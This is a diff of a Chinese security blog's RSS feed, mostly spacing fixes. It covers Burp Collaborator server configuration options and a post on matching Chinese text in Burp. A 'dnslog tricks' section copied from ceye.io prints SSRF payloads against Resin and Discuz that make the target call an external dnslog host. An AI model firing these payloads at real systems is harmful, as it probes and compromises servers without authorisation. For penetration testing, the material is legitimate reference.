+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;publicAddress&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;98.87.11.00&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">53&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;logLevel&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;INFO&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
 &lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>SERVERDOMAIN&lt;/th>
-&lt;th>Collaborator服务器将控制DNS的域或子域。DNS功能需要此设置。&lt;/th>
+&lt;th>Collaborator 服务器将控制 DNS 的域或子域。DNS 功能需要此设置。&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>workerThreads&lt;/td>
-&lt;td>Collaborator用于处理传入请求的线程数。&lt;/td>
+&lt;td>Collaborator 用于处理传入请求的线程数。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>eventCapture.localAddress&lt;/td>
-&lt;td>默认情况下，Collaborator将侦听所有本地接口以捕获交互事件。如果指定，它将仅侦听已配置的接口。&lt;/td>
+&lt;td>默认情况下，Collaborator 将侦听所有本地接口以捕获交互事件。如果指定，它将仅侦听已配置的接口。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>eventCapture.publicAddress&lt;/td>
-&lt;td>用于捕获交互事件的公共IP地址。&lt;/td>
+&lt;td>用于捕获交互事件的公共 IP 地址。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>eventCapture.http.ports&lt;/td>
-&lt;td>用于侦听HTTP交互事件的端口。如果正在转发端口80，则只应从默认值更改。&lt;/td>
+&lt;td>用于侦听 HTTP 交互事件的端口。如果正在转发端口 80，则只应从默认值更改。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>eventCapture.https.ports&lt;/td>
-&lt;td>用于侦听HTTPS交互事件的端口。如果正在转发端口443，则只应从默认值更改。&lt;/td>
+&lt;td>用于侦听 HTTPS 交互事件的端口。如果正在转发端口 443，则只应从默认值更改。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>eventCapture.smtp.ports&lt;/td>
-&lt;td>用于侦听SMTP交互事件的端口。如果正在转发端口25和587，则只应从默认值更改。&lt;/td>
+&lt;td>用于侦听 SMTP 交互事件的端口。如果正在转发端口 25 和 587，则只应从默认值更改。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>eventCapture.smtps.ports&lt;/td>
-&lt;td>用于侦听SMTPS交互事件的端口。如果正在转发端口465，则只应从默认值更改。&lt;/td>
+&lt;td>用于侦听 SMTPS 交互事件的端口。如果正在转发端口 465，则只应从默认值更改。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>eventCapture.https.hostname&lt;/td>
 &lt;td>用于生成自签名证书。有关详细信息，请参阅&lt;a class="link" href="https://portswigger.net/burp/documentation/collaborator/deploying#ssl-configuration" target="_blank" rel="noopener"
->SSL配置&lt;/a>。&lt;/td>
+>SSL 配置&lt;/a>。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>polling.localAddress&lt;/td>
-&lt;td>默认情况下，Collaborator将使用相同的网络接口捕获交互事件和提供轮询请求。如果指定，它将使用不同的接口来轮询请求。&lt;/td>
+&lt;td>默认情况下，Collaborator 将使用相同的网络接口捕获交互事件和提供轮询请求。如果指定，它将使用不同的接口来轮询请求。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>polling.publicAddress&lt;/td>
@@ -162,38 +165,38 @@ Burp Collaborator服务器的所有选项均使用配置文件进行控制。默
 &lt;/tr>
 &lt;tr>
 &lt;td>polling.http.port&lt;/td>
-&lt;td>用于通过HTTP轮询的端口。这可能是非标准的，需要&lt;a class="link" href="https://portswigger.net/burp/documentation/desktop/options/misc-project#burp-collaborator-server" target="_blank" rel="noopener"
+&lt;td>用于通过 HTTP 轮询的端口。这可能是非标准的，需要&lt;a class="link" href="https://portswigger.net/burp/documentation/desktop/options/misc-project#burp-collaborator-server" target="_blank" rel="noopener"
 >配置&lt;/a> Burp Suite 才能使用它。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>polling.https.port&lt;/td>
-&lt;td>用于通过HTTPS轮询的端口。这可能是非标准的，需要&lt;a class="link" href="https://portswigger.net/burp/documentation/desktop/options/misc-project#burp-collaborator-server" target="_blank" rel="noopener"
+&lt;td>用于通过 HTTPS 轮询的端口。这可能是非标准的，需要&lt;a class="link" href="https://portswigger.net/burp/documentation/desktop/options/misc-project#burp-collaborator-server" target="_blank" rel="noopener"
 >配置&lt;/a> Burp Suite 才能使用它。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>polling.https.hostname&lt;/td>
 &lt;td>用于生成自签名证书。有关详细信息，请参阅&lt;a class="link" href="https://portswigger.net/burp/documentation/collaborator/deploying#ssl-configuration" target="_blank" rel="noopener"
->SSL配置&lt;/a>。&lt;/td>
+>SSL 配置&lt;/a>。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>metrics.path&lt;/td>
-&lt;td>可以访问度量标准页面的URL路径。&lt;/td>
+&lt;td>可以访问度量标准页面的 URL 路径。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>metrics.whitelist&lt;/td>
-&lt;td>允许访问指标页面的客户端IP地址白名单。&lt;/td>
+&lt;td>允许访问指标页面的客户端 IP 地址白名单。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>dns.ports&lt;/td>
-&lt;td>用于侦听DNS查询的端口。如果正在转发端口53，则只应从默认值更改。&lt;/td>
+&lt;td>用于侦听 DNS 查询的端口。如果正在转发端口 53，则只应从默认值更改。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>dns.interfaces&lt;/td>
-&lt;td>用于侦听DNS查询的本地接口列表。如果您的注册商要求您为每个权威名称服务器配置不同的IP地址，则可以使用多个网络接口并使用此选项配置其位置。&lt;/td>
+&lt;td>用于侦听 DNS 查询的本地接口列表。如果您的注册商要求您为每个权威名称服务器配置不同的 IP 地址，则可以使用多个网络接口并使用此选项配置其位置。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>dns.interfaces.name&lt;/td>
-&lt;td>用于在此接口上运行的名称服务器的主机名。每个名称服务器应使用不同的主机名（例如ns1，ns2等）。&lt;/td>
+&lt;td>用于在此接口上运行的名称服务器的主机名。每个名称服务器应使用不同的主机名（例如 ns1，ns2 等）。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>dns.interfaces.localAddress&lt;/td>
@@ -201,7 +204,7 @@ Burp Collaborator服务器的所有选项均使用配置文件进行控制。默
 &lt;/tr>
 &lt;tr>
 &lt;td>dns.interfaces.publicAddress&lt;/td>
-&lt;td>与配置的本地地址对应的公共IP地址。通常，您需要在域的DNS记录中使用配置的主机名和公共IP地址。&lt;/td>
+&lt;td>与配置的本地地址对应的公共 IP 地址。通常，您需要在域的 DNS 记录中使用配置的主机名和公共 IP 地址。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>LOGLEVEL&lt;/td>
@@ -210,8 +213,8 @@ Burp Collaborator服务器的所有选项均使用配置文件进行控制。默
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
-&lt;h2 id="0x03-dnslog的更多骚操作">0x03 dnslog的更多骚操作
-&lt;/h2>&lt;p>以下内容来自dnslog开放平台&lt;a class="link" href="http://ceye.io/payloads" target="_blank" rel="noopener"
+&lt;h2 id="0x03-dnslog-的更多骚操作">0x03 dnslog 的更多骚操作
+&lt;/h2>&lt;p>以下内容来自 dnslog 开放平台&lt;a class="link" href="http://ceye.io/payloads" target="_blank" rel="noopener"
 >&lt;strong>ceye.io&lt;/strong>&lt;/a>。&lt;/p>
 &lt;h4 id="0x00-command-execution">0x00 Command Execution
 &lt;/h4>&lt;h5 id="i-nix">i. *nix:
@@ -279,10 +282,10 @@ pop graphic-context
 &lt;/h5>&lt;pre tabindex="0">&lt;code>xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf
 &lt;/code>&lt;/pre>&lt;h5 id="vi-discuz">vi. Discuz
 &lt;/h5>&lt;pre tabindex="0">&lt;code>http://xxx.xxxx.com/forum.php?mod=ajax&amp;amp;action=downremoteimg&amp;amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&amp;amp;formhash=xxoo
-&lt;/code>&lt;/pre></description></item><item><title>Burp中匹配中文</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</guid><description>&lt;img src="https://runshell.github.io/images/image1.png" alt="Featured image of post Burp中匹配中文" />&lt;p>**问题：**Burp中有很多地方可以进行正则匹配，比如Instruder模块中筛选响应包，proxy模块中匹并配替换字符串。中文在匹配的时候，添加进匹配列表就变身了，关键是与数据包内的相应字符不能匹配。&lt;/p>
+&lt;/code>&lt;/pre></description></item><item><title>Burp中匹配中文</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/</guid><description>&lt;img src="https://runshell.github.io/images/image1.png" alt="Featured image of post Burp中匹配中文" />&lt;p>**问题：**Burp 中有很多地方可以进行正则匹配，比如 Instruder 模块中筛选响应包，proxy 模块中匹并配替换字符串。中文在匹配的时候，添加进匹配列表就变身了，关键是与数据包内的相应字符不能匹配。&lt;/p>
 &lt;p>&lt;strong>解决办法：&lt;/strong>&lt;/p>
 &lt;ol>
-&lt;li>在user option中设置字符集(character sets)为显示原始字节流(Display as raw bytes);&lt;/li>
+&lt;li>在 user option 中设置字符集(character sets)为显示原始字节流(Display as raw bytes);&lt;/li>
 &lt;/ol>
 &lt;p>&lt;img src="https://runshell.github.io/images/image1.png"
 loading="lazy"
